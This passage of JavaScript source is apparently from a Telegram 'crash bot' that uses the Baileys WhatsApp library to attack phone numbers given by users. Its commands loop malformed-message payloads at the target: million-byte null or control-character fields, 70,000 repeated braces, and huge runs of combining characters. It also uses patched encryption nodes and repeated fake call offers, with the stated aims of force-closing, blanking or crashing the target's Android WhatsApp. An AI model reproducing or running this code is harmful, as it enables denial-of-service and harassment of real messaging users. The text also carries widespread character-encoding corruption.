  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡
â˜ Target: ${q}
â˜ Type: Forclose
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await FaiqForceDelete(target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Forclose
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraForceInvis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraForce 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡
â˜ Target: ${q}
â˜ Type: Forclose
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await FriendBerulah(sock, target);
   await FaiqCrashInvis(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Forclose
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraBlank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraCrash 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Blank Andro
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await FaiqOffc(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Blank Andro
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraCrash 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Blank Hard
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await KelBlank(target, type);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Blank Hard
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraCrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraCrash 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Crash Andro
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await FriendBerulah(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Crash Andro
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraCrashInvis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraCrashInvis 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Crash Andro
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await FriendBerulah(sock, target);
   await FaiqCrashInvis(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Crash Andro
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
//============( FUNCTION ) =======\\

// FUNCTION DELAY
async function KhasJawaDelayInvis(sock, target) {
Â  const FaiqOffc = generateWAMessageFromContent(
Â Â Â  target,
Â Â Â  {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
          body: {
            text: "Khas Jawa Delay Invis - @FaiqOffc",
            format: "NONE"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1048100),
            version: 3
            }
           }
          }
        }
Â Â Â Â Â  },
Â  Â Â { userJid: target }
Â  );
Â Â Â Â Â Â Â  
Â  await sock.relayMessage(
Â Â Â  target,
Â Â Â Â Â  FaiqOffc.message,
Â Â Â  {
Â Â Â Â Â  participant: { jid: target },
Â Â Â Â Â  messageId: FaiqOffc.key.id
Â Â Â  }
Â  );
}

// FUNCTION FORCLOSE
async function KhasJawaForce(sock, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = sock.createParticipantNodes.bind(sock);
let yntkts = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await sock.sendNode(lemiting);
}

async function KhasJawaForce2(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: "0" }
    );

    let lemiting = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },

                { tag: "net", attrs: { medium: "3" } },

                {
                    tag: "capability",
                    attrs: { ver: "1" },
                    content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                },

                { tag: "encopt", attrs: { keygen: "2" } },

                { tag: "destination", attrs: {}, content: destinations },

                ...(shouldIncludeDeviceIdentity ? [{
                    tag: "device-identity",
                    attrs: {},
                    content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                }] : [])
            ]
        }]
    };

    await sock.sendNode(lemiting);
}

async function FaiqForceDelete(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        paymentLinkMetadata: {
          button: {
            displayText: "FaiqOffc Attack You",
          },
          header: {
            headerType: 1,
          },
          provider: {
            paramsJson: "{".repeat(70000),
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: sock.generateMessageTag(),
  });
  
  await sock.sendMessage(target, {
    delete: msg.key,
  });
}

async function invisibleSpam(sock, target) {
Â Â Â  const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
Â Â Â  
Â Â Â  for (const x of type) {
Â Â Â Â Â Â Â  const enty = Math.floor(Math.random() * type.length);
Â Â Â Â Â Â Â  const msg = generateWAMessageFromContent(
Â Â Â Â Â Â Â Â Â Â Â  target,
Â Â Â Â Â Â Â Â Â Â Â  {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  viewOnceMessage: {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  message: {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  interactiveResponseMessage: {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  body: {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  text: "\u0003",
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  format: "DEFAULT"
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  },
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  nativeFlowResponseMessage: {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  name: x,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  paramsJson: "\x10".repeat(1000000),
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  version: 3
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  },
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  entryPointConversionSource: type[enty]
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â Â Â Â Â  },
Â Â Â Â Â Â Â Â Â Â Â  {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  participant: { jid: target }
Â Â Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â  );
Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â  await sock.relayMessage(
Â Â Â Â Â Â Â Â Â Â Â  target,
Â Â Â Â Â Â Â Â Â Â Â  {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  groupStatusMessageV2: {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  message: msg.message
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â Â Â Â Â  },
Â Â Â Â Â Â Â Â Â Â Â  {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  messageId: msg.key.id,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  participant: { jid: target }
Â Â Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â  );
Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â  await new Promise(resolve => setTimeout(resolve, 1000));
Â Â Â  }
}

async function FriendBerulah(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}

async function FaiqCrashInvis(sock, target) {
Â  const Faiq = generateWAMessageFromContent(
Â Â Â  target,
Â Â Â  {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
Â Â Â Â Â Â Â Â  Â  body: {
Â Â Â Â Â Â Â Â Â Â Â  text: "FaiqOffc Attack You"
Â Â Â Â Â Â Â Â Â Â Â   },
              paymentLinkMetadata: {
                provider: { 
                 paramsJson: "{".repeat(70000),
                   header: { 
                    headerType: 1 
                  },
                  button: { 
                    displayText: "FaiqOffc Attack You" 
                 },
Â Â Â Â Â Â Â Â Â      Â Â  version: 3,
Â Â Â Â Â Â Â Â Â Â       Â  sourceUrl: "t.me/FaiqOffc"
               }
             }
           }
          }
        }
Â Â Â Â Â  },
Â  Â Â { userJid: target }
Â  );
Â Â Â Â Â Â Â  
Â  await sock.relayMessage(
Â Â Â  target,
Â Â Â Â Â  Faiq.message,
Â Â Â  {
Â Â Â Â Â  participant: { jid: target },
Â Â Â Â Â  messageId: Faiq.key.id
Â Â Â  }
Â  );
}

async function FaiqOffc(target) {
  const CardsX = [];
  const header = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
      fileLength: 3714175,
      seconds: 19,
      mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
      height: 576,
      width: 768,
      fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
      directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1751466051",
      jpegThumbnail: "",
      streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5", 
      hasMediaAttachment: false,
    }, 
    body: {
      text: "ğŸ§ªâƒŸê™° FaiqCrash",
    },
  };
  
  for (let r = 0; r < 10; r++) {
    CardsX.push(
      header,  
      { name: "mpm",     buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",     buttonParamsJson: JSON.stringify({ display_text: "ê¦½".repeat(5000) }) },
      { name: "galaxy_message",     buttonParamsJson: JSON.stringify({ "icon": "RIVIEW","flow_cta": "FaiqOffc","flow_message_version": "3" }) },
    );
  }
  
  const msg = generateWAMessageFromContent(
    target, 
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "FaiqCrash" +
                "áŸ„áŸ".repeat(20000) +
                "ê¦½".repeat(25000),
            },
            carouselMessage: {
              CardsX,
              messageVersion: 1,
            },
            contextInfo: {
              remoteJid: "X",
              participant: "13135550202@s.whatsapp.net",
              fromMe: false,
              expiration: 7205,
              ephemeralSettingTimestamp: 2502,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: 7205
                },
              },
            },
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function KelBlank(target, type) {
  const cards = [];
  const header = {
    videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
       fileLength: 3714175,
       seconds: 19,
       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
       height: 576,
       width: 768,
       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
       mediaKeyTimestamp: "1751466051",
       jpegThumbnail: "",
